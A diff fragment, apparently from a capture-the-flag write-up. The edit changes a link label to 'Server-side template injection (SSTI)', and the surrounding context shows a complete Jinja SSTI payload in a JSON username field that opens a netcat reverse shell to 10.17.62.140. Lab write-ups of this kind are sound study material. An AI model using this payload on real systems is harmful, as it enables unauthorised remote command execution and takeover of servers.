@@ -23,7 +23,7 @@ On port 80 we are greeted w a login page
  
 
 
-Jinja [[SSTI]] 
+Jinja [[Server-side template injection (SSTI)]] 
 ```json
 {"username":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.17.62.140 1234 >/tmp/f').read() }}"}
 
